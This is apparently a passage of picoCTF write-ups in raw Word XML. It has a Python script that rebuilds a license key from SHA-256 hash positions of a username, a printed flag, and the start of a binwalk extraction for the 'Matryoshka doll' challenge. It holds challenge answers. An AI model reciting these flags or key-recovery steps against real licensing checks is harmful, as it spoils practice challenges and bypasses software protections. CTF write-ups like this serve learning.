          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>xxxxxxxx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C55B59">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13169AE0"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C55B59">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>key_part_static2_trial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CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>"}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65403C9E" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRPr="00C55B59" w:rsidRDefault="001B4D67" w:rsidP="001B4D67">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C55B59">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>key_full_template_trial</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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key_part_dynamic1_trial</w:t>
      </w:r>
      <w:r w:rsidRPr="00C55B59">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:r w:rsidRPr="00C55B59">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>key_part_static2_trial</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6270E8" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D67">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>It gives the static part of the flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1792699F" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D67">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>For the dynamic part of the flag:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66EABD9E" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D67">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">It compared the cert with the sha256 hash value of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>username_trial</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="567953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xml:space="preserve"># </w:t>
      </w:r>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="569CD6"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>TODO</w:t>
      </w:r>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="6A9955"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> : test performance on toolbox container</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0791C8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6A9955"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t># Check dynamic part --v</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC1EFD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p>
    <w:p w14:paraId="711AA51A"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263CD7D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7316DF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0E552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2EC89F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p>
    <w:p w14:paraId="77761C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9299A8F"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C1B23E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83D71D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48444667"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p>
    <w:p w14:paraId="7E4DB1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05991A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lastRenderedPageBreak/>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5DA87C68"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3B97FB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1E666D5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p>
    <w:p w14:paraId="5A7CBFB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7ED318DB"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036D79C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19E68B3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3C77530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p>
    <w:p w14:paraId="48B85D00"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63D4AAB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70A5B63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204B9134"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0E0E473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p>
    <w:p w14:paraId="54CFD6B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446CDF01"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FB40FDE"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59D17DB5"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54D05C39"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p>
    <w:p w14:paraId="586EDDE2"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30430583"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else</w:t>
      </w:r>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1637475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B5CEA8"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B8726D"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p>
    <w:p w14:paraId="7C0AA4AC"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if</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key</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i</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3F5C5BF6" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRPr="00866357" w:rsidRDefault="001B4D67" w:rsidP="001B4D6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return</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569CD6"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5540C169" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D67">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68FE3609" w14:textId="7B6BD7D9" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7344A534" w14:textId="2B82A205" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D8E6378" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2450FCEC" w14:textId="690EF585" w:rsidR="00866357" w:rsidRDefault="00866357" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Decode.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DEDDA16" w14:textId="60FCC9CE" w:rsidR="00C55B59" w:rsidRDefault="00C55B59" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">et the sha256 hash value of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>username_trial</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CD6DF64" w14:textId="6513E2BF" w:rsidR="00C55B59" w:rsidRDefault="00C55B59" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>nd find each char by the giving position from the hash value.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79277A9C"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hashlib</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7A97BA24"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from</w:t>
      </w:r>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="4EC9B0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>cryptography</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4EC9B0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>fernet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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Fernet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29CCE08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C586C0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>import</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4EC9B0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>base64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33CD7E38"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CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6FFD83"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>username_trial</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>"PRITCHARD"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5D7C41"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 xml:space="preserve"> = </w:t>
      </w:r>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="4EC9B0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>hashlib</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sha256</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9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>username_trial</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DCDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>encode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>'utf-8'</w:t>
      </w:r>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>)).</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="DCDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>hexdigest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2974B895"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9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>code</w:t>
      </w:r>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">+= </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4</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5</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3</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6</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2</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7</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1</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hash</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B5CEA8"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DDA066A" w14:textId="77777777" w:rsidR="00866357" w:rsidRPr="00866357" w:rsidRDefault="00866357" w:rsidP="00866357">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="DCDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>code</w:t>
      </w:r>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC80D15" w14:textId="072C9693" w:rsidR="00866357" w:rsidRDefault="00866357" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F16CDD0" w14:textId="77777777" w:rsidR="00866357" w:rsidRDefault="00866357" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55CDF224" w14:textId="3048B934" w:rsidR="0014279A" w:rsidRDefault="0014279A" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="50" w:name="_Hlk112529627"/>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014279A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014279A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{1n_7h3_|&lt;3y_of_</w:t>
      </w:r>
      <w:r w:rsidR="00E32EE5" w:rsidRPr="00E32EE5">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>54ef6292</w:t>
      </w:r>
      <w:r w:rsidR="00E32EE5">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
      <w:bookmarkEnd w:id="50"/>
    </w:p>
    <w:p w14:paraId="70F5D47B" w14:textId="21E575A9" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7ADF9B59" w14:textId="6F57A60E" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="108A69B0" w14:textId="29054F7E" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A3E50CB" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D6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Matryoshka doll</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43AE6BC4"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 | 30 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="156906F6" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D6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793CCD27" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D6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SUSIE/PANDU</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C973D71" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D6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11CDDA9" w14:textId="00F847C2" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D6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Matryoshka dolls are a set of wooden dolls of decreasing size placed one inside another. What's the final one? Image: </w:t>
      </w:r>
      <w:hyperlink r:id="rId101" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>this</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4FE59573" w14:textId="51B2E0BE" w:rsidR="00E86710" w:rsidRPr="007C33FA" w:rsidRDefault="007C33FA" w:rsidP="001B4D67">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C33FA">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>solution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B84BF31" w14:textId="6F126FC1" w:rsidR="00E86710" w:rsidRDefault="00E86710" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">xtract files using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>binwalk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4BC76459" w14:textId="778D40B5" w:rsidR="001B4D67" w:rsidRDefault="00E86710" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>binwalk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> -e dolls.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660749DF" w14:textId="1E76569B" w:rsidR="00E86710" w:rsidRDefault="00E86710" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve">DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- </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0x0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> PNG image, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>594</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
